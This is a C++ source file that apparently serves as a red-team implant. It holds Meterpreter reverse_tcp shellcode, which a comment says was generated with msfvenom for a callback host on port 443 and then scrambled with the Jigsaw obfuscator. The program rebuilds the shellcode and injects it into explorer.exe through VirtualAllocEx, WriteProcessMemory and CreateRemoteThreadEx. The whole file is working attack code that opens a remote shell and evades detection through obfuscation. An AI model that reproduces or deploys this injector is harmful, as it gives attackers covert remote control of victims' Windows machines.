#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

/* msfvenom --platform --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=172.21.235.3 LPORT=443 EXITFUNC=thread -f c --var-name=shellcode -o payload.bin */
/* Jigsaw gebruikt om de code te obfuscaten python3 jigsaw.py payload.bin */
/* https://github.com/RedSiege/Jigsaw */

unsigned char jigsaw[511] = { 0x49, 0x5a, 0xf0, 0x00, 0xc1, 0xba, 0xe4, 0xac, 0x49, 0x52, 0x01, 0x49, 0x2c, 0x56, 0x00, 0x41, 0xe3, 0xba, 0x58, 0x41, 0xf6, 0x48, 0xff, 0x24, 0x41, 0x89, 0x4d, 0x93, 0x49, 0xd5, 0xe6, 0x4c, 0x5a, 0x60, 0x18, 0x00, 0x5a, 0x10, 0x89, 0xff, 0x48, 0x8b, 0xc7, 0x8b, 0xd0, 0x50, 0xd5, 0x1d, 0x02, 0x00, 0xf6, 0x0d, 0x20, 0x7c, 0x20, 0xe7, 0x80, 0x00, 0x40, 0x83, 0x49, 0x48, 0x31, 0x41, 0xd9, 0x02, 0x41, 0x48, 0x01, 0x00, 0x41, 0x31, 0xf8, 0x01, 0x00, 0x89, 0xc1, 0x5e, 0x57, 0x56, 0x48, 0xff, 0x41, 0xa0, 0xc9, 0xc0, 0x00, 0xc0, 0x49, 0x41, 0x7e, 0x85, 0xd0, 0x75, 0xda, 0xe9, 0x00, 0x48, 0x89, 0x52, 0x89, 0x41, 0xe0, 0x01, 0x41, 0x89, 0x48, 0x41, 0x41, 0x32, 0x89, 0xcc, 0x29, 0x41, 0xba, 0x28, 0x41, 0xff, 0x88, 0x56, 0xdf, 0x89, 0x20, 0x58, 0x89, 0x58, 0xd5, 0x26, 0xd5, 0x02, 0xd5, 0x7d, 0x66, 0x48, 0xc3, 0x02, 0x41, 0x53, 0x89, 0xd6, 0x54, 0x5a, 0x5d, 0x00, 0x48, 0xc9, 0x41, 0x48, 0x4d, 0x78, 0x5e, 0x2f, 0xea, 0xa4, 0x48, 0x01, 0x8b, 0x4d, 0x0f, 0x48, 0x52, 0x8b, 0x07, 0xc9, 0x8b, 0x49, 0xd2, 0xc9, 0xc1, 0xbb, 0x00, 0x4d, 0x41, 0x31, 0x85, 0x41, 0x48, 0x77, 0x68, 0xd0, 0x4c, 0x89, 0x3c, 0xd5, 0xd9, 0x0f, 0xce, 0x4c, 0x8b, 0x58, 0xd8, 0xc0, 0x85, 0x89, 0x00, 0x41, 0x4d, 0x77, 0x8b, 0x48, 0x58, 0x0b, 0x00, 0xc8, 0x75, 0x65, 0xf9, 0xea, 0x85, 0x5e, 0x01, 0xba, 0x58, 0x61, 0xec, 0xc9, 0x12, 0x48, 0x0f, 0x81, 0x48, 0xbb, 0xff, 0x6a, 0x80, 0x0f, 0x4d, 0x5f, 0x59, 0xff, 0xba, 0xbc, 0xb7, 0xc0, 0x41, 0x00, 0x08, 0xe5, 0x20, 0xed, 0x02, 0x00, 0xe5, 0x52, 0x4b, 0xd0, 0xff, 0x88, 0x41, 0x88, 0x6a, 0x00, 0x40, 0xff, 0x89, 0xa5, 0xbe, 0x0d, 0x8b, 0x00, 0x10, 0x0a, 0x89, 0x01, 0xc9, 0x74, 0xf1, 0x41, 0x41, 0xc9, 0xf9, 0xff, 0xff, 0x18, 0xec, 0xb4, 0x74, 0x41, 0x50, 0xc0, 0x00, 0x49, 0x5f, 0x39, 0x48, 0xda, 0x83, 0x0c, 0xd0, 0x00, 0x31, 0x48, 0x75, 0x48, 0xc0, 0x52, 0x41, 0x31, 0xff, 0x48, 0xc3, 0x3c, 0x31, 0xff, 0x00, 0x75, 0xd0, 0x6e, 0x01, 0x41, 0x29, 0x41, 0xe0, 0x01, 0xff, 0x41, 0x48, 0x48, 0x72, 0x89, 0x00, 0x5f, 0x8b, 0x48, 0x48, 0xf1, 0x44, 0x51, 0x52, 0x0a, 0x00, 0x01, 0x8b, 0xff, 0xc4, 0x41, 0xec, 0xba, 0x75, 0x50, 0x41, 0xe2, 0x49, 0x04, 0xc1, 0x57, 0x41, 0x48, 0x83, 0xba, 0xff, 0xff, 0xce, 0x68, 0x51, 0xe2, 0xc8, 0x48, 0x8b, 0x00, 0x42, 0x81, 0xd1, 0x8b, 0xc1, 0x61, 0x48, 0xac, 0xff, 0x59, 0xc9, 0x03, 0x83, 0x8b, 0x8b, 0x49, 0xff, 0x40, 0x72, 0x4a, 0x6b, 0xf8, 0x48, 0x49, 0xc2, 0xc9, 0xff, 0x18, 0x41, 0x50, 0x48, 0x73, 0xe0, 0x6a, 0x48, 0x01, 0xf2, 0xff, 0x00, 0x48, 0x61, 0x4c, 0x44, 0x89, 0x10, 0x0b, 0xac, 0xc7, 0x00, 0x0a, 0xba, 0x48, 0x6a, 0xf9, 0x48, 0x58, 0xc0, 0x34, 0x52, 0x83, 0x4d, 0x55, 0xfc, 0xd5, 0x58, 0x89, 0x30, 0x8b, 0x40, 0x41, 0x59, 0x58, 0x89, 0x59, 0x00, 0xe8, 0x44, 0x99, 0xe8, 0x89, 0x50, 0x45, 0x41, 0x31, 0xba, 0x4a, 0x48, 0x59, 0x59, 0x67, 0x00, 0x41, 0x51, 0x3c, 0x83, 0x2a, 0x00, 0x58, 0x20, 0x01, 0xeb, 0x48, 0x4c, 0x6a, 0x58, 0xe9, 0x41, 0x00, 0x48, 0x48, 0x31, 0xd5, 0x03, 0xf0, 0xff, 0x01, 0x32, 0x33, 0x48, 0x6a, 0x48, 0x74, 0xc6, 0xff, 0x00, 0x59, 0xe2, 0x15, 0xe0, 0xd5, 0x1c, 0xe4, 0x20, 0x89, 0x40, 0xe5, 0x04, 0x59, 0x31, 0x41, 0x58, 0x66, 0x01, 0xd5, 0xff, 0x49, 0x31, 0x68, 0x4c, 0x38, 0x24 };
int positions[511] = { 159, 187, 423, 377, 306, 259, 254, 48, 227, 14, 172, 237, 53, 226, 86, 506, 114, 405, 189, 452, 386, 41, 200, 158, 320, 316, 38, 346, 415, 411, 229, 266, 205, 23, 28, 347, 193, 353, 365, 296, 401, 30, 317, 164, 102, 288, 437, 503, 432, 8, 491, 58, 383, 51, 197, 496, 90, 243, 169, 195, 421, 301, 358, 258, 433, 242, 122, 295, 111, 395, 174, 117, 376, 127, 280, 253, 134, 185, 465, 24, 398, 495, 467, 233, 359, 131, 440, 297, 215, 190, 378, 84, 112, 142, 426, 209, 236, 489, 425, 27, 326, 285, 201, 160, 275, 267, 25, 389, 430, 219, 385, 6, 487, 55, 458, 442, 163, 476, 91, 115, 311, 428, 68, 453, 299, 182, 335, 262, 282, 52, 314, 441, 77, 354, 414, 369, 133, 408, 238, 128, 251, 456, 214, 499, 129, 135, 328, 166, 289, 79, 384, 460, 309, 407, 20, 244, 156, 418, 83, 206, 64, 26, 263, 121, 71, 171, 18, 40, 56, 245, 348, 471, 12, 39, 336, 494, 29, 261, 447, 161, 144, 305, 73, 510, 370, 461, 477, 255, 89, 406, 153, 337, 96, 399, 455, 69, 357, 217, 66, 126, 397, 81, 88, 434, 152, 19, 366, 268, 490, 286, 234, 329, 154, 333, 352, 291, 208, 16, 310, 231, 304, 501, 313, 454, 278, 34, 292, 372, 446, 481, 308, 241, 35, 294, 225, 272, 148, 239, 106, 63, 82, 392, 344, 199, 210, 180, 281, 177, 457, 125, 498, 224, 157, 463, 228, 331, 216, 136, 104, 92, 319, 284, 355, 138, 403, 338, 143, 362, 183, 57, 327, 480, 334, 80, 232, 493, 332, 396, 44, 97, 87, 340, 435, 150, 194, 508, 375, 165, 173, 94, 293, 100, 469, 119, 47, 31, 444, 46, 436, 486, 485, 49, 402, 373, 349, 343, 76, 470, 271, 250, 277, 203, 312, 179, 410, 59, 350, 95, 85, 416, 9, 220, 123, 298, 1, 257, 155, 15, 22, 505, 448, 101, 21, 264, 382, 10, 196, 276, 492, 287, 307, 324, 240, 176, 61, 445, 137, 178, 381, 468, 302, 212, 342, 391, 70, 62, 371, 65, 175, 235, 72, 78, 151, 168, 139, 50, 325, 132, 341, 274, 420, 145, 2, 42, 207, 110, 211, 449, 43, 36, 279, 439, 427, 475, 300, 118, 213, 109, 188, 113, 364, 218, 141, 360, 74, 270, 400, 120, 223, 412, 472, 146, 167, 413, 393, 459, 246, 417, 273, 339, 368, 108, 318, 429, 315, 202, 303, 124, 67, 351, 116, 379, 0, 265, 184, 422, 462, 107, 105, 192, 186, 321, 507, 500, 7, 345, 103, 330, 5, 323, 13, 149, 404, 419, 431, 37, 230, 390, 466, 99, 450, 367, 11, 479, 438, 504, 394, 497, 54, 75, 248, 483, 260, 283, 443, 478, 181, 451, 380, 33, 290, 464, 249, 4, 473, 484, 222, 221, 45, 387, 424, 98, 488, 482, 93, 191, 356, 247, 502, 374, 170, 3, 32, 256, 388, 409, 361, 204, 130, 198, 363, 162, 60, 474, 509, 252, 17, 269, 322, 140, 147 };
int calc_len = 511;
unsigned char calc_payload[511] = { 0x00 };
int position;

// Reconstruct the payload
void reconstruct_shellcode() {
    for (int idx = 0; idx < sizeof(positions) / sizeof(positions[0]); idx++) {
        position = positions[idx];
        calc_payload[position] = jigsaw[idx];
    }
};

class ProcessInjector {
public:
    const char* k = "[+]";
    const char* i = "[*]";
    const char* e = "[-]";

    DWORD TID = NULL;
    LPVOID rBuffer = NULL;
    HANDLE hProcess, hThread = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    void injectIntoProcess(const wchar_t* processName) {
        reconstruct_shellcode();

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        Process32First(snapshot, &pe32);

        do {
            if (wcscmp(pe32.szExeFile, processName) == 0) {
                openHandleToProcess(pe32.th32ProcessID);
                if (hProcess != NULL) {
                    allocateMemory();
                    if (rBuffer != NULL) {
                        writeMemory();
                        createRemoteThread();
                    }
                    cleanup();
                }
                break;
            }
        } while (Process32Next(snapshot, &pe32));
    }

private:


    void openHandleToProcess(DWORD processID) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
        printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);
        if (hProcess == NULL) {
            printf("%s couldn't get a handle to the process (%ld), error: %ld", e, processID, GetLastError());
        }
    }

    void allocateMemory() {
        rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(calc_payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(calc_payload));
    }

    void writeMemory() {
        WriteProcessMemory(hProcess, rBuffer, calc_payload, sizeof(calc_payload), NULL);
        printf("%s wrote %zu-bytes to process memory\n", k, sizeof(calc_payload));
    }

    void createRemoteThread() {
        hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
        if (hThread == NULL) {
            printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
        }
        else {
            printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);
            waitForThread();
        }
    }

    void waitForThread() {
        printf("%s waiting for thread to finish\n", i);
        WaitForSingleObject(hThread, INFINITE);
        printf("%s thread finished executing\n", k);
    }

    void cleanup() {
        printf("%s cleaning up\n", i);
        if (hThread != NULL) CloseHandle(hThread);
        if (hProcess != NULL) CloseHandle(hProcess);
        printf("%s finished!\n", k);
    }
};

int main(int argc, char* argv[]) {
    ProcessInjector injector;
    injector.injectIntoProcess(L"explorer.exe");
    return EXIT_SUCCESS;
}